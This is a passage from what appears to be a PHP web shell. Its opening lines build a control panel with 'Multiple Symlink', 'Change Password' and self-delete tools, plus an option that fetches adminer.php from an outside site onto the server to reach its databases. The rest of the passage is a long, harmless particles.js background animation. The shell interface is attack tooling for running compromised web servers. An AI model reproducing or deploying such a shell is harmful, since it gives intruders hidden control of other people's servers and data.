print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">Multiple Symlink</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'symlink&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">Change Password</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'change&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-pin-drop zmdi-hc-fw"></i></td><td class="td-tools-content">Me : [ <span class="label-success">' . str_replace('/', '', basename($_SERVER['PHP_SELF'])) . ' </span> ]</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'kill&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-delete zmdi-hc-fw"></i></button></a></td></table></div>';

print '<script type="text/javascript">function create(){
if(document.getElementById("c").value == ""){'; s("Select the file to be created"); print 'return false;
    } document.getElementById("jmbt").submit();
  } </script>';

switch ($_UNDERXPLOIT['op']) {
	case ('1'): switch (true) {
	case (op('adminer.php', 'https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php')): mtr('?' . x5 . $dir);
		bacot('File created successfully');
break;
	default: bacot('Failed to create file');
	}
}

print '<div class="tools-content top" style="padding:5px">';
print '<table><form action="?' . x5 . $dir . '" method="POST"><td align="center" style="width:10%"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></span></td><td style="width:70%"><select name="op" id="c">';
print '<option value=""> -- Create file --</option>';
print '<option value="1">MySQL [ adminer.php ]</option>';
print '</select>
</td>
	<td style="width:20%;text-align:right"><button type="submit" class="btn-exe" onclick="create();return false;" id="jmbt"><i class="zmdi zmdi-long-arrow-return zmdi-hc-fw"></i></button></form>
			</td>
	   </table>
</div>';

print '<script type="text/javascript">
	var pJS = function(tag_id, params) {
    var canvas_el = document.querySelector(\'#\' + tag_id + \' > .particles-js-canvas-el\');
    this.pJS = {
        canvas: {
            el: canvas_el,
            w: canvas_el.offsetWidth,
            h: canvas_el.offsetHeight
        },
        particles: {
            number: {
                value: 400,
                density: {
                    enable: !0,
                    value_area: 800
                }
            },
            color: {
                value: \'#fff\'
            },
            shape: {
                type: \'circle\',
                stroke: {
                    width: 0,
                    color: \'#ff0000\'
                },
                polygon: {
                    nb_sides: 5
                },
                image: {
                    src: \'\',
                    width: 100,
                    height: 100
                }
            },
            opacity: {
                value: 1,
                random: !1,
                anim: {
                    enable: !1,
                    speed: 2,
                    opacity_min: 0,
                    sync: !1
                }
            },
            size: {
                value: 20,
                random: !1,
                anim: {
                    enable: !1,
                    speed: 20,
                    size_min: 0,
                    sync: !1
                }
            },
            line_linked: {
                enable: !0,
                distance: 100,
                color: \'#fff\',
                opacity: 1,
                width: 1
            },
            move: {
                enable: !0,
                speed: 2,
                direction: \'none\',
                random: !1,
                straight: !1,
                out_mode: \'out\',
                bounce: !1,
                attract: {
                    enable: !1,
                    rotateX: 3000,
                    rotateY: 3000
                }
            },
            array: []
        },
        interactivity: {
            detect_on: \'canvas\',
            events: {
                onhover: {
                    enable: !0,
                    mode: \'grab\'
                },
                onclick: {
                    enable: !0,
                    mode: \'push\'
                },
                resize: !0
            },
            modes: {
                grab: {
                    distance: 100,
                    line_linked: {
                        opacity: 1
                    }
                },
                bubble: {
                    distance: 200,
                    size: 80,
                    duration: 0.4
                },
                repulse: {
                    distance: 200,
                    duration: 0.4
                },
                push: {
                    particles_nb: 4
                },
                remove: {
                    particles_nb: 2
                }
            },
            mouse: {}
        },
        retina_detect: !1,
        fn: {
            interact: {},
            modes: {},
            vendors: {}
        },
        tmp: {}
    };
    var pJS = this.pJS;
    if (params) {
        Object.deepExtend(pJS, params)
    }
    pJS.tmp.obj = {
        size_value: pJS.particles.size.value,
        size_anim_speed: pJS.particles.size.anim.speed,
        move_speed: pJS.particles.move.speed,
        line_linked_distance: pJS.particles.line_linked.distance,
        line_linked_width: pJS.particles.line_linked.width,
        mode_grab_distance: pJS.interactivity.modes.grab.distance,
        mode_bubble_distance: pJS.interactivity.modes.bubble.distance,
        mode_bubble_size: pJS.interactivity.modes.bubble.size,
        mode_repulse_distance: pJS.interactivity.modes.repulse.distance
    };
    pJS.fn.retinaInit = function() {
        if (pJS.retina_detect && window.devicePixelRatio > 1) {
            pJS.canvas.pxratio = window.devicePixelRatio;
            pJS.tmp.retina = !0
        } else {
            pJS.canvas.pxratio = 1;
            pJS.tmp.retina = !1
        }
        pJS.canvas.w = pJS.canvas.el.offsetWidth * pJS.canvas.pxratio;
        pJS.canvas.h = pJS.canvas.el.offsetHeight * pJS.canvas.pxratio;
        pJS.particles.size.value = pJS.tmp.obj.size_value * pJS.canvas.pxratio;
        pJS.particles.size.anim.speed = pJS.tmp.obj.size_anim_speed * pJS.canvas.pxratio;
        pJS.particles.move.speed = pJS.tmp.obj.move_speed * pJS.canvas.pxratio;
        pJS.particles.line_linked.distance = pJS.tmp.obj.line_linked_distance * pJS.canvas.pxratio;
        pJS.interactivity.modes.grab.distance = pJS.tmp.obj.mode_grab_distance * pJS.canvas.pxratio;
        pJS.interactivity.modes.bubble.distance = pJS.tmp.obj.mode_bubble_distance * pJS.canvas.pxratio;
        pJS.particles.line_linked.width = pJS.tmp.obj.line_linked_width * pJS.canvas.pxratio;
        pJS.interactivity.modes.bubble.size = pJS.tmp.obj.mode_bubble_size * pJS.canvas.pxratio;
        pJS.interactivity.modes.repulse.distance = pJS.tmp.obj.mode_repulse_distance * pJS.canvas.pxratio
    };
    pJS.fn.canvasInit = function() {
        pJS.canvas.ctx = pJS.canvas.el.getContext(\'2d\')
    };
    pJS.fn.canvasSize = function() {
        pJS.canvas.el.width = pJS.canvas.w;
        pJS.canvas.el.height = pJS.canvas.h;
        if (pJS && pJS.interactivity.events.resize) {
            window.addEventListener(\'resize\', function() {
                pJS.canvas.w = pJS.canvas.el.offsetWidth;
                pJS.canvas.h = pJS.canvas.el.offsetHeight;
                if (pJS.tmp.retina) {
                    pJS.canvas.w *= pJS.canvas.pxratio;
                    pJS.canvas.h *= pJS.canvas.pxratio
                }
                pJS.canvas.el.width = pJS.canvas.w;
                pJS.canvas.el.height = pJS.canvas.h;
                if (!pJS.particles.move.enable) {
                    pJS.fn.particlesEmpty();
                    pJS.fn.particlesCreate();
                    pJS.fn.particlesDraw();
                    pJS.fn.vendors.densityAutoParticles()
                }
                pJS.fn.vendors.densityAutoParticles()
            })
        }
    };
    pJS.fn.canvasPaint = function() {
        pJS.canvas.ctx.fillRect(0, 0, pJS.canvas.w, pJS.canvas.h)
    };
    pJS.fn.canvasClear = function() {
        pJS.canvas.ctx.clearRect(0, 0, pJS.canvas.w, pJS.canvas.h)
    };
    pJS.fn.particle = function(color, opacity, position) {
        this.radius = (pJS.particles.size.random ? Math.random() : 1) * pJS.particles.size.value;
        if (pJS.particles.size.anim.enable) {
            this.size_status = !1;
            this.vs = pJS.particles.size.anim.speed / 100;
            if (!pJS.particles.size.anim.sync) {
                this.vs = this.vs * Math.random()
            }
        }
        this.x = position ? position.x : Math.random() * pJS.canvas.w;
        this.y = position ? position.y : Math.random() * pJS.canvas.h;
        if (this.x > pJS.canvas.w - this.radius * 2) this.x = this.x - this.radius;
        else if (this.x < this.radius * 2) this.x = this.x + this.radius;
        if (this.y > pJS.canvas.h - this.radius * 2) this.y = this.y - this.radius;
        else if (this.y < this.radius * 2) this.y = this.y + this.radius;
        if (pJS.particles.move.bounce) {
            pJS.fn.vendors.checkOverlap(this, position)
        }
        this.color = {};
        if (typeof(color.value) == \'object\') {
            if (color.value instanceof Array) {
                var color_selected = color.value[Math.floor(Math.random() * pJS.particles.color.value.length)];
                this.color.rgb = hexToRgb(color_selected)
            } else {
                if (color.value.r != undefined && color.value.g != undefined && color.value.b != undefined) {
                    this.color.rgb = {
                        r: color.value.r,
                        g: color.value.g,
                        b: color.value.b
                    }
                }
                if (color.value.h != undefined && color.value.s != undefined && color.value.l != undefined) {
                    this.color.hsl = {
                        h: color.value.h,
                        s: color.value.s,
                        l: color.value.l
                    }
                }
            }
        } else if (color.value == \'random\') {
            this.color.rgb = {
                r: (Math.floor(Math.random() * (255 - 0 + 1)) + 0),
                g: (Math.floor(Math.random() * (255 - 0 + 1)) + 0),
                b: (Math.floor(Math.random() * (255 - 0 + 1)) + 0)
            }
        } else if (typeof(color.value) == \'string\') {
            this.color = color;
            this.color.rgb = hexToRgb(this.color.value)
        }
        this.opacity = (pJS.particles.opacity.random ? Math.random() : 1) * pJS.particles.opacity.value;
        if (pJS.particles.opacity.anim.enable) {
            this.opacity_status = !1;
            this.vo = pJS.particles.opacity.anim.speed / 100;
            if (!pJS.particles.opacity.anim.sync) {
                this.vo = this.vo * Math.random()
            }
        }
        var velbase = {}
        switch (pJS.particles.move.direction) {
            case \'top\':
                velbase = {
                    x: 0,
                    y: -1
                };
                break;
            case \'top-right\':
                velbase = {
                    x: 0.5,
                    y: -0.5
                };
                break;
            case \'right\':
                velbase = {
                    x: 1,
                    y: -0
                };
                break;
            case \'bottom-right\':
                velbase = {
                    x: 0.5,
                    y: 0.5
                };
                break;
            case \'bottom\':
                velbase = {
                    x: 0,
                    y: 1
                };
                break;
            case \'bottom-left\':
                velbase = {
                    x: -0.5,
                    y: 1
                };
                break;
            case \'left\':
                velbase = {
                    x: -1,
                    y: 0
                };
                break;
            case \'top-left\':
                velbase = {
                    x: -0.5,
                    y: -0.5
                };
                break;
            default:
                velbase = {
                    x: 0,
                    y: 0
                };
                break
        }
        if (pJS.particles.move.straight) {
            this.vx = velbase.x;
            this.vy = velbase.y;
            if (pJS.particles.move.random) {
                this.vx = this.vx * (Math.random());
                this.vy = this.vy * (Math.random())
            }
        } else {
            this.vx = velbase.x + Math.random() - 0.5;
            this.vy = velbase.y + Math.random() - 0.5
        }
        this.vx_i = this.vx;
        this.vy_i = this.vy;
        var shape_type = pJS.particles.shape.type;
        if (typeof(shape_type) == \'object\') {
            if (shape_type instanceof Array) {
                var shape_selected = shape_type[Math.floor(Math.random() * shape_type.length)];
                this.shape = shape_selected
            }
        } else {
            this.shape = shape_type
        }
        if (this.shape == \'image\') {
            var sh = pJS.particles.shape;
            this.img = {
                src: sh.image.src,
                ratio: sh.image.width / sh.image.height
            }
            if (!this.img.ratio) this.img.ratio = 1;
            if (pJS.tmp.img_type == \'svg\' && pJS.tmp.source_svg != undefined) {
                pJS.fn.vendors.createSvgImg(this);
                if (pJS.tmp.pushing) {
                    this.img.loaded = !1
                }
            }
        }
    };
    pJS.fn.particle.prototype.draw = function() {
        var p = this;
        if (p.radius_bubble != undefined) {
            var radius = p.radius_bubble
        } else {
            var radius = p.radius
        }
        if (p.opacity_bubble != undefined) {
            var opacity = p.opacity_bubble
        } else {
            var opacity = p.opacity
        }
        if (p.color.rgb) {
            var color_value = \'rgba(\' + p.color.rgb.r + \',\' + p.color.rgb.g + \',\' + p.color.rgb.b + \',\' + opacity + \')\'
        } else {
            var color_value = \'hsla(\' + p.color.hsl.h + \',\' + p.color.hsl.s + \'%,\' + p.color.hsl.l + \'%,\' + opacity + \')\'
        }
        pJS.canvas.ctx.fillStyle = color_value;
        pJS.canvas.ctx.beginPath();
        switch (p.shape) {
            case \'circle\':
                pJS.canvas.ctx.arc(p.x, p.y, radius, 0, Math.PI * 2, !1);
                break;
            case \'edge\':
                pJS.canvas.ctx.rect(p.x - radius, p.y - radius, radius * 2, radius * 2);
                break;
            case \'triangle\':
                pJS.fn.vendors.drawShape(pJS.canvas.ctx, p.x - radius, p.y + radius / 1.66, radius * 2, 3, 2);
                break;
            case \'polygon\':
                pJS.fn.vendors.drawShape(pJS.canvas.ctx, p.x - radius / (pJS.particles.shape.polygon.nb_sides / 3.5), p.y - radius / (2.66 / 3.5), radius * 2.66 / (pJS.particles.shape.polygon.nb_sides / 3), pJS.particles.shape.polygon.nb_sides, 1);
                break;
            case \'star\':
                pJS.fn.vendors.drawShape(pJS.canvas.ctx, p.x - radius * 2 / (pJS.particles.shape.polygon.nb_sides / 4), p.y - radius / (2 * 2.66 / 3.5), radius * 2 * 2.66 / (pJS.particles.shape.polygon.nb_sides / 3), pJS.particles.shape.polygon.nb_sides, 2);
                break;
            case \'image\':
                function draw() {
                    pJS.canvas.ctx.drawImage(img_obj, p.x - radius, p.y - radius, radius * 2, radius * 2 / p.img.ratio)
                }
                if (pJS.tmp.img_type == \'svg\') {
                    var img_obj = p.img.obj
                } else {
                    var img_obj = pJS.tmp.img_obj
                }
                if (img_obj) {
                    draw()
                }
                break
        }
        pJS.canvas.ctx.closePath();
        if (pJS.particles.shape.stroke.width > 0) {
            pJS.canvas.ctx.strokeStyle = pJS.particles.shape.stroke.color;
            pJS.canvas.ctx.lineWidth = pJS.particles.shape.stroke.width;
            pJS.canvas.ctx.stroke()
        }
        pJS.canvas.ctx.fill()
    };
    pJS.fn.particlesCreate = function() {
        for (var i = 0; i < pJS.particles.number.value; i++) {
            pJS.particles.array.push(new pJS.fn.particle(pJS.particles.color, pJS.particles.opacity.value))
        }
    };
    pJS.fn.particlesUpdate = function() {
        for (var i = 0; i < pJS.particles.array.length; i++) {
            var p = pJS.particles.array[i];
            if (pJS.particles.move.enable) {
                var ms = pJS.particles.move.speed / 2;
                p.x += p.vx * ms;
                p.y += p.vy * ms
            }
            if (pJS.particles.opacity.anim.enable) {
                if (p.opacity_status == !0) {
                    if (p.opacity >= pJS.particles.opacity.value) p.opacity_status = !1;
                    p.opacity += p.vo
                } else {
                    if (p.opacity <= pJS.particles.opacity.anim.opacity_min) p.opacity_status = !0;
                    p.opacity -= p.vo
                }
                if (p.opacity < 0) p.opacity = 0
            }
            if (pJS.particles.size.anim.enable) {
                if (p.size_status == !0) {
                    if (p.radius >= pJS.particles.size.value) p.size_status = !1;
                    p.radius += p.vs
                } else {
                    if (p.radius <= pJS.particles.size.anim.size_min) p.size_status = !0;
                    p.radius -= p.vs
                }
                if (p.radius < 0) p.radius = 0
            }
            if (pJS.particles.move.out_mode == \'bounce\') {
                var new_pos = {
                    x_left: p.radius,
                    x_right: pJS.canvas.w,
                    y_top: p.radius,
                    y_bottom: pJS.canvas.h
                }
            } else {
                var new_pos = {
                    x_left: -p.radius,
                    x_right: pJS.canvas.w + p.radius,
                    y_top: -p.radius,
                    y_bottom: pJS.canvas.h + p.radius
                }
            }
            if (p.x - p.radius > pJS.canvas.w) {
                p.x = new_pos.x_left;
                p.y = Math.random() * pJS.canvas.h
            } else if (p.x + p.radius < 0) {
                p.x = new_pos.x_right;
                p.y = Math.random() * pJS.canvas.h
            }
            if (p.y - p.radius > pJS.canvas.h) {
                p.y = new_pos.y_top;
                p.x = Math.random() * pJS.canvas.w
            } else if (p.y + p.radius < 0) {
                p.y = new_pos.y_bottom;
                p.x = Math.random() * pJS.canvas.w
            }
            switch (pJS.particles.move.out_mode) {
                case \'bounce\':
                    if (p.x + p.radius > pJS.canvas.w) p.vx = -p.vx;
                    else if (p.x - p.radius < 0) p.vx = -p.vx;
                    if (p.y + p.radius > pJS.canvas.h) p.vy = -p.vy;
                    else if (p.y - p.radius < 0) p.vy = -p.vy;
                    break
            }
            if (isInArray(\'grab\', pJS.interactivity.events.onhover.mode)) {
                pJS.fn.modes.grabParticle(p)
            }
            if (isInArray(\'bubble\', pJS.interactivity.events.onhover.mode) || isInArray(\'bubble\', pJS.interactivity.events.onclick.mode)) {
                pJS.fn.modes.bubbleParticle(p)
            }
            if (isInArray(\'repulse\', pJS.interactivity.events.onhover.mode) || isInArray(\'repulse\', pJS.interactivity.events.onclick.mode)) {
                pJS.fn.modes.repulseParticle(p)
            }
            if (pJS.particles.line_linked.enable || pJS.particles.move.attract.enable) {
                for (var j = i + 1; j < pJS.particles.array.length; j++) {
                    var p2 = pJS.particles.array[j];
                    if (pJS.particles.line_linked.enable) {
                        pJS.fn.interact.linkParticles(p, p2)
                    }
                    if (pJS.particles.move.attract.enable) {
                        pJS.fn.interact.attractParticles(p, p2)
                    }
                    if (pJS.particles.move.bounce) {
                        pJS.fn.interact.bounceParticles(p, p2)
                    }
                }
            }
        }
    };
    pJS.fn.particlesDraw = function() {
        pJS.canvas.ctx.clearRect(0, 0, pJS.canvas.w, pJS.canvas.h);
        pJS.fn.particlesUpdate();
        for (var i = 0; i < pJS.particles.array.length; i++) {
            var p = pJS.particles.array[i];
            p.draw()
        }
    };
    pJS.fn.particlesEmpty = function() {
        pJS.particles.array = []
    };
    pJS.fn.particlesRefresh = function() {
        cancelRequestAnimFrame(pJS.fn.checkAnimFrame);
        cancelRequestAnimFrame(pJS.fn.drawAnimFrame);
        pJS.tmp.source_svg = undefined;
        pJS.tmp.img_obj = undefined;
        pJS.tmp.count_svg = 0;
        pJS.fn.particlesEmpty();
        pJS.fn.canvasClear();
        pJS.fn.vendors.start()
    };
    pJS.fn.interact.linkParticles = function(p1, p2) {
        var dx = p1.x - p2.x,
            dy = p1.y - p2.y,
            dist = Math.sqrt(dx * dx + dy * dy);
        if (dist <= pJS.particles.line_linked.distance) {
            var opacity_line = pJS.particles.line_linked.opacity - (dist / (1 / pJS.particles.line_linked.opacity)) / pJS.particles.line_linked.distance;
            if (opacity_line > 0) {
                var color_line = pJS.particles.line_linked.color_rgb_line;
                pJS.canvas.ctx.strokeStyle = \'rgba(\' + color_line.r + \',\' + color_line.g + \',\' + color_line.b + \',\' + opacity_line + \')\';
                pJS.canvas.ctx.lineWidth = pJS.particles.line_linked.width;
                pJS.canvas.ctx.beginPath();
                pJS.canvas.ctx.moveTo(p1.x, p1.y);
                pJS.canvas.ctx.lineTo(p2.x, p2.y);
                pJS.canvas.ctx.stroke();
                pJS.canvas.ctx.closePath()
            }
        }
    };
    pJS.fn.interact.attractParticles = function(p1, p2) {
        var dx = p1.x - p2.x,
            dy = p1.y - p2.y,
            dist = Math.sqrt(dx * dx + dy * dy);
        if (dist <= pJS.particles.line_linked.distance) {
            var ax = dx / (pJS.particles.move.attract.rotateX * 1000),
                ay = dy / (pJS.particles.move.attract.rotateY * 1000);
            p1.vx -= ax;
            p1.vy -= ay;
            p2.vx += ax;
            p2.vy += ay
        }
    }
    pJS.fn.interact.bounceParticles = function(p1, p2) {
        var dx = p1.x - p2.x,
            dy = p1.y - p2.y,
            dist = Math.sqrt(dx * dx + dy * dy),
            dist_p = p1.radius + p2.radius;
        if (dist <= dist_p) {
            p1.vx = -p1.vx;
            p1.vy = -p1.vy;
            p2.vx = -p2.vx;
            p2.vy = -p2.vy
        }
    }
    pJS.fn.modes.pushParticles = function(nb, pos) {
        pJS.tmp.pushing = !0;
        for (var i = 0; i < nb; i++) {
            pJS.particles.array.push(new pJS.fn.particle(pJS.particles.color, pJS.particles.opacity.value, {
                \'x\': pos ? pos.pos_x : Math.random() * pJS.canvas.w,
                \'y\': pos ? pos.pos_y : Math.random() * pJS.canvas.h
            }))
            if (i == nb - 1) {
                if (!pJS.particles.move.enable) {
                    pJS.fn.particlesDraw()
                }
                pJS.tmp.pushing = !1
            }
        }
    };
    pJS.fn.modes.removeParticles = function(nb) {
        pJS.particles.array.splice(0, nb);
        if (!pJS.particles.move.enable) {
            pJS.fn.particlesDraw()
        }
    };
    pJS.fn.modes.bubbleParticle = function(p) {
        if (pJS.interactivity.events.onhover.enable && isInArray(\'bubble\', pJS.interactivity.events.onhover.mode)) {
            var dx_mouse = p.x - pJS.interactivity.mouse.pos_x,
                dy_mouse = p.y - pJS.interactivity.mouse.pos_y,
                dist_mouse = Math.sqrt(dx_mouse * dx_mouse + dy_mouse * dy_mouse),
                ratio = 1 - dist_mouse / pJS.interactivity.modes.bubble.distance;

            function init() {
                p.opacity_bubble = p.opacity;
                p.radius_bubble = p.radius
            }
            if (dist_mouse <= pJS.interactivity.modes.bubble.distance) {
                if (ratio >= 0 && pJS.interactivity.status == \'mousemove\') {
                    if (pJS.interactivity.modes.bubble.size != pJS.particles.size.value) {
                        if (pJS.interactivity.modes.bubble.size > pJS.particles.size.value) {
                            var size = p.radius + (pJS.interactivity.modes.bubble.size * ratio);
                            if (size >= 0) {
                                p.radius_bubble = size
                            }
                        } else {
                            var dif = p.radius - pJS.interactivity.modes.bubble.size,
                                size = p.radius - (dif * ratio);
                            if (size > 0) {
                                p.radius_bubble = size
                            } else {
                                p.radius_bubble = 0
                            }
                        }
                    }
                    if (pJS.interactivity.modes.bubble.opacity != pJS.particles.opacity.value) {
                        if (pJS.interactivity.modes.bubble.opacity > pJS.particles.opacity.value) {
                            var opacity = pJS.interactivity.modes.bubble.opacity * ratio;
                            if (opacity > p.opacity && opacity <= pJS.interactivity.modes.bubble.opacity) {
                                p.opacity_bubble = opacity
                            }
                        } else {
                            var opacity = p.opacity - (pJS.particles.opacity.value - pJS.interactivity.modes.bubble.opacity) * ratio;
                            if (opacity < p.opacity && opacity >= pJS.interactivity.modes.bubble.opacity) {
                                p.opacity_bubble = opacity
                            }
                        }
                    }
                }
            } else {
                init()
            }
            if (pJS.interactivity.status == \'mouseleave\') {
                init()
            }
        } else if (pJS.interactivity.events.onclick.enable && isInArray(\'bubble\', pJS.interactivity.events.onclick.mode)) {
            if (pJS.tmp.bubble_clicking) {
                var dx_mouse = p.x - pJS.interactivity.mouse.click_pos_x,
                    dy_mouse = p.y - pJS.interactivity.mouse.click_pos_y,
                    dist_mouse = Math.sqrt(dx_mouse * dx_mouse + dy_mouse * dy_mouse),
                    time_spent = (new Date().getTime() - pJS.interactivity.mouse.click_time) / 1000;
                if (time_spent > pJS.interactivity.modes.bubble.duration) {
                    pJS.tmp.bubble_duration_end = !0
                }
                if (time_spent > pJS.interactivity.modes.bubble.duration * 2) {
                    pJS.tmp.bubble_clicking = !1;
                    pJS.tmp.bubble_duration_end = !1
                }
            }

            function process(bubble_param, particles_param, p_obj_bubble, p_obj, id) {
                if (bubble_param != particles_param) {
                    if (!pJS.tmp.bubble_duration_end) {
                        if (dist_mouse <= pJS.interactivity.modes.bubble.distance) {
                            if (p_obj_bubble != undefined) var obj = p_obj_bubble;
                            else var obj = p_obj;
                            if (obj != bubble_param) {
                                var value = p_obj - (time_spent * (p_obj - bubble_param) / pJS.interactivity.modes.bubble.duration);
                                if (id == \'size\') p.radius_bubble = value;
                                if (id == \'opacity\') p.opacity_bubble = value
                            }
                        } else {
                            if (id == \'size\') p.radius_bubble = undefined;
                            if (id == \'opacity\') p.opacity_bubble = undefined
                        }
                    } else {
                        if (p_obj_bubble != undefined) {
                            var value_tmp = p_obj - (time_spent * (p_obj - bubble_param) / pJS.interactivity.modes.bubble.duration),
                                dif = bubble_param - value_tmp;
                            value = bubble_param + dif;
                            if (id == \'size\') p.radius_bubble = value;
                            if (id == \'opacity\') p.opacity_bubble = value
                        }
                    }
                }
            }
            if (pJS.tmp.bubble_clicking) {
                process(pJS.interactivity.modes.bubble.size, pJS.particles.size.value, p.radius_bubble, p.radius, \'size\');
                process(pJS.interactivity.modes.bubble.opacity, pJS.particles.opacity.value, p.opacity_bubble, p.opacity, \'opacity\')
            }
        }
    };
    pJS.fn.modes.repulseParticle = function(p) {
        if (pJS.interactivity.events.onhover.enable && isInArray(\'repulse\', pJS.interactivity.events.onhover.mode) && pJS.interactivity.status == \'mousemove\') {
            var dx_mouse = p.x - pJS.interactivity.mouse.pos_x,
                dy_mouse = p.y - pJS.interactivity.mouse.pos_y,
                dist_mouse = Math.sqrt(dx_mouse * dx_mouse + dy_mouse * dy_mouse);
            var normVec = {
                    x: dx_mouse / dist_mouse,
                    y: dy_mouse / dist_mouse
                },
                repulseRadius = pJS.interactivity.modes.repulse.distance,
                velocity = 100,
                repulseFactor = clamp((1 / repulseRadius) * (-1 * Math.pow(dist_mouse / repulseRadius, 2) + 1) * repulseRadius * velocity, 0, 50);
            var pos = {
                x: p.x + normVec.x * repulseFactor,
                y: p.y + normVec.y * repulseFactor
            }
            if (pJS.particles.move.out_mode == \'bounce\') {
                if (pos.x - p.radius > 0 && pos.x + p.radius < pJS.canvas.w) p.x = pos.x;
                if (pos.y - p.radius > 0 && pos.y + p.radius < pJS.canvas.h) p.y = pos.y
            } else {
                p.x = pos.x;
                p.y = pos.y
            }
        } else if (pJS.interactivity.events.onclick.enable && isInArray(\'repulse\', pJS.interactivity.events.onclick.mode)) {
            if (!pJS.tmp.repulse_finish) {
                pJS.tmp.repulse_count++;
                if (pJS.tmp.repulse_count == pJS.particles.array.length) {
                    pJS.tmp.repulse_finish = !0
                }
            }
            if (pJS.tmp.repulse_clicking) {
                var repulseRadius = Math.pow(pJS.interactivity.modes.repulse.distance / 6, 3);
                var dx = pJS.interactivity.mouse.click_pos_x - p.x,
                    dy = pJS.interactivity.mouse.click_pos_y - p.y,
                    d = dx * dx + dy * dy;
                var force = -repulseRadius / d * 1;

                function process() {
                    var f = Math.atan2(dy, dx);
                    p.vx = force * Math.cos(f);
                    p.vy = force * Math.sin(f);
                    if (pJS.particles.move.out_mode == \'bounce\') {
                        var pos = {
                            x: p.x + p.vx,
                            y: p.y + p.vy
                        }
                        if (pos.x + p.radius > pJS.canvas.w) p.vx = -p.vx;
                        else if (pos.x - p.radius < 0) p.vx = -p.vx;
                        if (pos.y + p.radius > pJS.canvas.h) p.vy = -p.vy;
                        else if (pos.y - p.radius < 0) p.vy = -p.vy
                    }
                }
                if (d <= repulseRadius) {
                    process()
                }
            } else {
                if (pJS.tmp.repulse_clicking == !1) {
                    p.vx = p.vx_i;
                    p.vy = p.vy_i
                }
            }
        }
    }
    pJS.fn.modes.grabParticle = function(p) {
        if (pJS.interactivity.events.onhover.enable && pJS.interactivity.status == \'mousemove\') {
            var dx_mouse = p.x - pJS.interactivity.mouse.pos_x,
                dy_mouse = p.y - pJS.interactivity.mouse.pos_y,
                dist_mouse = Math.sqrt(dx_mouse * dx_mouse + dy_mouse * dy_mouse);
            if (dist_mouse <= pJS.interactivity.modes.grab.distance) {
                var opacity_line = pJS.interactivity.modes.grab.line_linked.opacity - (dist_mouse / (1 / pJS.interactivity.modes.grab.line_linked.opacity)) / pJS.interactivity.modes.grab.distance;
                if (opacity_line > 0) {
                    var color_line = pJS.particles.line_linked.color_rgb_line;
                    pJS.canvas.ctx.strokeStyle = \'rgba(\' + color_line.r + \',\' + color_line.g + \',\' + color_line.b + \',\' + opacity_line + \')\';
                    pJS.canvas.ctx.lineWidth = pJS.particles.line_linked.width;
                    pJS.canvas.ctx.beginPath();
                    pJS.canvas.ctx.moveTo(p.x, p.y);
                    pJS.canvas.ctx.lineTo(pJS.interactivity.mouse.pos_x, pJS.interactivity.mouse.pos_y);
                    pJS.canvas.ctx.stroke();
                    pJS.canvas.ctx.closePath()
                }
            }
        }
    };
    pJS.fn.vendors.eventsListeners = function() {
        if (pJS.interactivity.detect_on == \'window\') {
            pJS.interactivity.el = window
        } else {
            pJS.interactivity.el = pJS.canvas.el
        }
        if (pJS.interactivity.events.onhover.enable || pJS.interactivity.events.onclick.enable) {
            pJS.interactivity.el.addEventListener(\'mousemove\', function(e) {
                if (pJS.interactivity.el == window) {
                    var pos_x = e.clientX,
                        pos_y = e.clientY
                } else {
                    var pos_x = e.offsetX || e.clientX,
                        pos_y = e.offsetY || e.clientY
                }
                pJS.interactivity.mouse.pos_x = pos_x;
                pJS.interactivity.mouse.pos_y = pos_y;
                if (pJS.tmp.retina) {
                    pJS.interactivity.mouse.pos_x *= pJS.canvas.pxratio;
                    pJS.interactivity.mouse.pos_y *= pJS.canvas.pxratio
                }
                pJS.interactivity.status = \'mousemove\'
            });
            pJS.interactivity.el.addEventListener(\'mouseleave\', function(e) {
                pJS.interactivity.mouse.pos_x = null;
                pJS.interactivity.mouse.pos_y = null;
                pJS.interactivity.status = \'mouseleave\'
            })
        }
        if (pJS.interactivity.events.onclick.enable) {
            pJS.interactivity.el.addEventListener(\'click\', function() {
                pJS.interactivity.mouse.click_pos_x = pJS.interactivity.mouse.pos_x;
                pJS.interactivity.mouse.click_pos_y = pJS.interactivity.mouse.pos_y;
                pJS.interactivity.mouse.click_time = new Date().getTime();
                if (pJS.interactivity.events.onclick.enable) {
                    switch (pJS.interactivity.events.onclick.mode) {
                        case \'push\':
                            if (pJS.particles.move.enable) {
                                pJS.fn.modes.pushParticles(pJS.interactivity.modes.push.particles_nb, pJS.interactivity.mouse)
                            } else {
                                if (pJS.interactivity.modes.push.particles_nb == 1) {
                                    pJS.fn.modes.pushParticles(pJS.interactivity.modes.push.particles_nb, pJS.interactivity.mouse)
                                } else if (pJS.interactivity.modes.push.particles_nb > 1) {
                                    pJS.fn.modes.pushParticles(pJS.interactivity.modes.push.particles_nb)
                                }
                            }
                            break;
                        case \'remove\':
                            pJS.fn.modes.removeParticles(pJS.interactivity.modes.remove.particles_nb);
                            break;
                        case \'bubble\':
                            pJS.tmp.bubble_clicking = !0;
                            break;
                        case \'repulse\':
                            pJS.tmp.repulse_clicking = !0;
                            pJS.tmp.repulse_count = 0;
                            pJS.tmp.repulse_finish = !1;
                            setTimeout(function() {
                                pJS.tmp.repulse_clicking = !1
                            }, pJS.interactivity.modes.repulse.duration * 1000)
                            break
                    }
                }
            })
        }
    };
    pJS.fn.vendors.densityAutoParticles = function() {
        if (pJS.particles.number.density.enable) {
            var area = pJS.canvas.el.width * pJS.canvas.el.height / 1000;
            if (pJS.tmp.retina) {
                area = area / (pJS.canvas.pxratio * 2)
            }
            var nb_particles = area * pJS.particles.number.value / pJS.particles.number.density.value_area;
            var missing_particles = pJS.particles.array.length - nb_particles;
